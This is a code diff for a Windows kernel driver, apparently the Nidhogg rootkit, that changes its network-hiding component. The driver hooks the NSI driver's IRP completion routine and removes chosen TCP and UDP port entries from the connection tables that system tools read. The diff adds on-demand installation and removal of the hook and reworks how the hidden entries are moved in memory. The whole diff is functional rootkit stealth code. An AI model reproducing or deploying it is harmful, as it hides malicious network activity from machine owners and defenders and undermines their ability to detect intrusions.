@@ -19,6 +19,14 @@ _IRQL_requires_max_(APC_LEVEL)
 NetworkHandler::~NetworkHandler() {
 	IrqlGuard guard;
 	guard.SetExitIrql(PASSIVE_LEVEL);
+
+	if (callbackActivated) {
+		NTSTATUS status = InstallNsiHook(true);
+
+		if (!NT_SUCCESS(status))
+			Print(DRIVER_PREFIX "Failed to remove NSI hook: (0x%08X).\n", status);
+		callbackActivated = false;
+	}
 	ClearHiddenPortsList(PortType::All);
 	FreeVirtualMemory(hiddenTcpPorts.Items);
 	FreeVirtualMemory(hiddenUdpPorts.Items);
@@ -41,7 +49,13 @@ NTSTATUS NetworkHandler::InstallNsiHook(_In_ bool remove) {
 	NTSTATUS status = STATUS_SUCCESS;
 
 	RtlInitUnicodeString(&driverName, NSI_DRIVER_NAME);
-	status = ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, 
+	status = ObReferenceObjectByName(&driverName, 
+		OBJ_CASE_INSENSITIVE, 
+		NULL, 
+		0, 
+		*IoDriverObjectType, 
+		KernelMode, 
+		NULL, 
 		reinterpret_cast<PVOID*>(&driverObject));
 
 	if (!NT_SUCCESS(status))
@@ -114,6 +128,15 @@ bool NetworkHandler::AddHiddenPort(_In_ HiddenPort& port) {
 	newEntry->Type = port.Type;
 	newEntry->Remote = port.Remote;
 
+	if (!callbackActivated) {
+		NTSTATUS status = InstallNsiHook();
+
+		if (!NT_SUCCESS(status)) {
+			FreeVirtualMemory(newEntry);
+			return false;
+		}
+	}
+
 	switch (port.Type) {
 		case PortType::TCP: {
 			AddEntry<HiddenPorts, HiddenPort>(&hiddenTcpPorts, newEntry);
@@ -139,6 +162,8 @@ bool NetworkHandler::AddHiddenPort(_In_ HiddenPort& port) {
 */
 _IRQL_requires_max_(APC_LEVEL)
 bool NetworkHandler::RemoveHiddenPort(_In_ HiddenPort& port) {
+	bool removed = false;
+
 	auto finder = [](_In_ const HiddenPort* entry, _In_ HiddenPort& other) -> bool {
 		return entry->Port == other.Port && entry->Remote == other.Remote;
 	};
@@ -149,19 +174,32 @@ bool NetworkHandler::RemoveHiddenPort(_In_ HiddenPort& port) {
 
 		if (!entry)
 			return false;
-		return RemoveListEntry<HiddenPorts, HiddenPort>(&hiddenTcpPorts, entry);
+		removed = RemoveListEntry<HiddenPorts, HiddenPort>(&hiddenTcpPorts, entry);
+		break;
 	}
-
 	case PortType::UDP: {
-		HiddenPort* entry = FindListEntry<HiddenPorts, HiddenPort, HiddenPort&>(hiddenTcpPorts, port, finder);
+		HiddenPort* entry = FindListEntry<HiddenPorts, HiddenPort, HiddenPort&>(hiddenUdpPorts, port, finder);
 
 		if (!entry)
 			return false;
-		return RemoveListEntry<HiddenPorts, HiddenPort>(&hiddenUdpPorts, entry);
+		removed = RemoveListEntry<HiddenPorts, HiddenPort>(&hiddenUdpPorts, entry);
+		break;
 	}
 	default:
 		return false;
 	}
+
+	if (removed) {
+		if (hiddenTcpPorts.Count == 0 && hiddenUdpPorts.Count == 0 && callbackActivated) {
+			NTSTATUS status = InstallNsiHook(true);
+
+			if (!NT_SUCCESS(status))
+				Print(DRIVER_PREFIX "Failed to remove NSI hook: (0x%08X).\n", status);
+			else
+				callbackActivated = false;
+		}
+	}
+	return true;
 }
 
 /*
@@ -179,13 +217,37 @@ void NetworkHandler::ClearHiddenPortsList(_In_ PortType portType) {
 	switch (portType) {
 	case PortType::TCP:
 		ClearList<HiddenPorts, HiddenPort>(&hiddenTcpPorts);
+		if (hiddenTcpPorts.Count == 0 && hiddenUdpPorts.Count == 0 && callbackActivated) {
+			NTSTATUS status = InstallNsiHook(true);
+
+			if (!NT_SUCCESS(status))
+				Print(DRIVER_PREFIX "Failed to remove NSI hook: (0x%08X).\n", status);
+			else
+				callbackActivated = false;
+		}
 		break;
 	case PortType::UDP:
 		ClearList<HiddenPorts, HiddenPort>(&hiddenUdpPorts);
+		if (hiddenTcpPorts.Count == 0 && hiddenUdpPorts.Count == 0 && callbackActivated) {
+			NTSTATUS status = InstallNsiHook(true);
+
+			if (!NT_SUCCESS(status))
+				Print(DRIVER_PREFIX "Failed to remove NSI hook: (0x%08X).\n", status);
+			else
+				callbackActivated = false;
+		}
 		break;
 	case PortType::All:
 		ClearList<HiddenPorts, HiddenPort>(&hiddenTcpPorts);
 		ClearList<HiddenPorts, HiddenPort>(&hiddenUdpPorts);
+
+		if (callbackActivated) {
+			NTSTATUS status = InstallNsiHook(true);
+
+			if (!NT_SUCCESS(status))
+				Print(DRIVER_PREFIX "Failed to remove NSI hook: (0x%08X).\n", status);
+			callbackActivated = false;
+		}
 		break;
 	}
 }
@@ -260,13 +322,18 @@ bool NetworkHandler::ListHiddenPorts(_Inout_ IoctlHiddenPorts* hiddenPorts) cons
 * @statusEntries  [_Inout_ PNSI_STATUS_ENTRY]  -- Pointer to the status entries.
 * @processEntries [_Inout_ PNSI_PROCESS_ENTRY] -- Pointer to the process entries.
 * @index		  [_In_ SIZE_T]				   -- Index of the entry to hide.
+* @mode			  [_In_ MODE]				   -- The mode of the caller (UserMode or KernelMode).
 * 
 * Returns:
 * @status		  [NTSTATUS]				   -- Whether successfully hidden or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS HidePort(_Inout_ PVOID entries, _In_ PNSI_PARAM nsiParameter, _Inout_ PNSI_STATUS_ENTRY statusEntries,
-	_Inout_ PNSI_PROCESS_ENTRY processEntries, _In_ SIZE_T index) {
+NTSTATUS HidePort(_Inout_ PVOID entries, 
+	_In_ PNSI_PARAM nsiParameter, 
+	_Inout_ PNSI_STATUS_ENTRY statusEntries,
+	_Inout_ PNSI_PROCESS_ENTRY processEntries, 
+	_In_ SIZE_T index,
+	_In_ MODE mode) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PUCHAR pEntries = static_cast<PUCHAR>(entries);
 
@@ -284,31 +351,25 @@ NTSTATUS HidePort(_Inout_ PVOID entries, _In_ PNSI_PARAM nsiParameter, _Inout_ P
 			return GetExceptionCode();
 		}
 	}
-
 	else {
+		PEPROCESS currentProcess = PsGetCurrentProcess();
 		SIZE_T bytesToMove = (nsiParameter->Count - (index + 1)) * nsiParameter->EntrySize;
-		status = MmCopyVirtualMemory(
-			PsGetCurrentProcess(),
-			pEntries + (index + 1) * nsiParameter->EntrySize,
-			PsGetCurrentProcess(),
-			pEntries + index * nsiParameter->EntrySize,
+		errno_t err = memmove_s(pEntries + index * nsiParameter->EntrySize,
 			bytesToMove,
-			KernelMode,
-			nullptr);
+			pEntries + (index + 1) * nsiParameter->EntrySize,
+			bytesToMove);
 
-		if (!NT_SUCCESS(status))
+		if (err != 0) {
+			status = STATUS_UNSUCCESSFUL;
 			return status;
+		}
 
 		if (statusEntries) {
 			SIZE_T bytesToMoveStatus = (nsiParameter->Count - (index + 1)) * sizeof(NSI_STATUS_ENTRY);
-			status = MmCopyVirtualMemory(
-				PsGetCurrentProcess(),
-				&statusEntries[index + 1],
-				PsGetCurrentProcess(),
-				&statusEntries[index],
+			err = memmove_s(&statusEntries[index],
 				bytesToMoveStatus,
-				KernelMode,
-				nullptr);
+				&statusEntries[index + 1],
+				bytesToMoveStatus);
 
 			if (!NT_SUCCESS(status))
 				return status;
@@ -316,14 +377,11 @@ NTSTATUS HidePort(_Inout_ PVOID entries, _In_ PNSI_PARAM nsiParameter, _Inout_ P
 
 		if (processEntries) {
 			SIZE_T bytesToMoveProcess = (nsiParameter->Count - (index + 1)) * nsiParameter->ProcessEntrySize;
-			status = MmCopyVirtualMemory(
-				PsGetCurrentProcess(),
-				&processEntries[index + 1],
-				PsGetCurrentProcess(),
-				&processEntries[index],
+			err = memmove_s(&processEntries[index],
 				bytesToMoveProcess,
-				KernelMode,
-				nullptr);
+				&processEntries[index + 1],
+				bytesToMoveProcess);
+
 			if (!NT_SUCCESS(status))
 				return status;
 		}
@@ -348,6 +406,8 @@ _IRQL_requires_max_(APC_LEVEL)
 _IRQL_requires_same_
 NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _Inout_ PVOID irpContext) {
 	SIZE_T entriesHidden = 0;
+	MODE addressMode = UserMode;
+	MemoryGuard guard = MemoryGuard();
 	HookedCompletionRoutine* context = static_cast<HookedCompletionRoutine*>(irpContext);
 
 	if (NT_SUCCESS(irp->IoStatus.Status)) {
@@ -355,7 +415,7 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 			PNSI_PARAM nsiParameter = static_cast<PNSI_PARAM>(irp->UserBuffer);
 
 			if (!nsiParameter || (!VALID_KERNELMODE_MEMORY(reinterpret_cast<ULONGLONG>(nsiParameter)) &&
-				!NT_SUCCESS(ProbeAddress(nsiParameter, sizeof(PNSI_PARAM), sizeof(PNSI_PARAM))))) [[ unlikely ]] {
+				!NT_SUCCESS(ProbeAddress(nsiParameter, sizeof(PNSI_PARAM), __alignof(PNSI_PARAM))))) [[ unlikely ]] {
 				break;
 			}
 
@@ -369,10 +429,14 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 				for (SIZE_T i = 0; i < nsiParameter->Count; i++) {
 					if (nsiParameter->Type == COMUNICATION_TYPE::TCP) {
 						// Edge case of somehow the entries list is empty or invalid address of entry.
-						if (!tcpEntries)
+						if (!tcpEntries) [[ unlikely ]]
 							continue;
+						addressMode = VALID_KERNELMODE_MEMORY(reinterpret_cast<ULONGLONG>(&tcpEntries[i])) ? 
+							KernelMode : 
+							UserMode;
+						guard.GuardMemory(&tcpEntries[i], sizeof(NSI_TABLE_TCP_ENTRY), addressMode);
 
-						if (!ProbeAddress(&tcpEntries[i], sizeof(NSI_TABLE_TCP_ENTRY), sizeof(NSI_TABLE_TCP_ENTRY)))
+						if (!guard.IsValid()) [[ unlikely ]]
 							continue;
 
 						__try {
@@ -381,8 +445,16 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 							hiddenPort.Remote = false;
 
 							if (NidhoggNetworkHandler->FindHiddenPort(hiddenPort)) {
-								if (!NT_SUCCESS(HidePort(tcpEntries, nsiParameter, statusEntries, processEntries, i)))
+								guard.UnguardMemory();
+
+								if (!NT_SUCCESS(HidePort(tcpEntries,
+									nsiParameter,
+									statusEntries,
+									processEntries,
+									i,
+									addressMode))) {
 									break;
+								}
 								entriesHidden++;
 							}
 
@@ -391,8 +463,16 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 							hiddenPort.Remote = true;
 
 							if (NidhoggNetworkHandler->FindHiddenPort(hiddenPort)) {
-								if (!NT_SUCCESS(HidePort(tcpEntries, nsiParameter, statusEntries, processEntries, i)))
+								guard.UnguardMemory();
+
+								if (!NT_SUCCESS(HidePort(tcpEntries,
+									nsiParameter,
+									statusEntries,
+									processEntries,
+									i,
+									addressMode))) {
 									break;
+								}
 								entriesHidden++;
 							}
 						}
@@ -400,10 +480,15 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 					}
 					else if (nsiParameter->Type == COMUNICATION_TYPE::UDP) {
 						// Edge case of somehow the entries list is empty or invalid address of entry.
-						if (!udpEntries)
+						if (!udpEntries) [[ unlikely ]]
 							continue;
 
-						if (!ProbeAddress(&udpEntries[i], sizeof(NSI_UDP_ENTRY), sizeof(NSI_UDP_ENTRY)))
+						addressMode = VALID_KERNELMODE_MEMORY(reinterpret_cast<ULONGLONG>(&udpEntries[i])) ? 
+							KernelMode : 
+							UserMode;
+						guard.GuardMemory(&udpEntries[i], sizeof(NSI_UDP_ENTRY), addressMode);
+
+						if (!guard.IsValid()) [[ unlikely ]]
 							continue;
 
 						__try {
@@ -411,13 +496,22 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 							hiddenPort.Type = PortType::UDP;
 
 							if (NidhoggNetworkHandler->FindHiddenPort(hiddenPort)) {
-								if (!NT_SUCCESS(HidePort(udpEntries, nsiParameter, statusEntries, processEntries, i)))
+								guard.UnguardMemory();
+
+								if (!NT_SUCCESS(HidePort(udpEntries,
+									nsiParameter,
+									statusEntries,
+									processEntries,
+									i,
+									addressMode))) {
 									break;
+								}
 								entriesHidden++;
 							}
 						}
 						__except (EXCEPTION_EXECUTE_HANDLER) { }
 					}
+					guard.UnguardMemory();
 				}
 
 				nsiParameter->Count -= entriesHidden;
